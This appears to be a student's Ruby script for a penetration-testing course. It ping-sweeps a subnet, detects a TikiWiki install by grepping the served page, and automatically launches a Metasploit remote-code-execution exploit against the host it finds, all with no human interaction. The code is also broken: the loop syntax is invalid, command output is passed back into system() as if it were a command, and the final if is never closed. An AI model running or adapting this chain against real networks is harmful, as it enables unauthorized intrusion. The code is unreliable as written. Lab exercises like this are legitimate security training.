#April Parker
#CSIT 188 - PenTest+
# The goal was to have the script be 100% automated with no human interaction
#This script is meant to run in a Virtual Environment with a Metasploit (attacker vm) with several potential victim VMs. 
#The script will scan the subnet and locate a system where the tikiwiki vulnerability exist and exploit it.

#!/usr/local/bin/ruby -w

#I dont know what machine is vulnerable so I hardcoded the first 3 octets of the subnet
subnet="192.168.68."

#Ping Sweep  - What systems are alive - I added the 10-15 range to scan due to speed
for octetFour in 10..15 do |ip=subnet + octetFour.to_s|
	puts 'Checking ' + ip
	pingCall=`ping -c1 #{ip} >> ping.txt`
	system(pingCall)
end

#System Calls
system("cat ping.txt | grep -B1 '1 received' >>pingresults.txt")

#Read Ping Results, Output victim's IP
f=File.open 'pingresults.txt'
victimIP=f.gets[4,13]
puts "The victim's IP is #{victimIP}"

#Pull tikiwiki from the html file being served at victim's IP
flag=`curl -s http://#{victimIP} | grep -c 'tikiwiki'`
system(flag)
puts flag

if flag.to_i > 0
	puts "Starting msfconsole...please wait"
	system("msfconsole -q -x 'use exploit/unix/webapp/tikiwiki_graph_formula_exec;set rhost %s; exploit;'"%victimIP)
else
	puts "tikiwiki not found"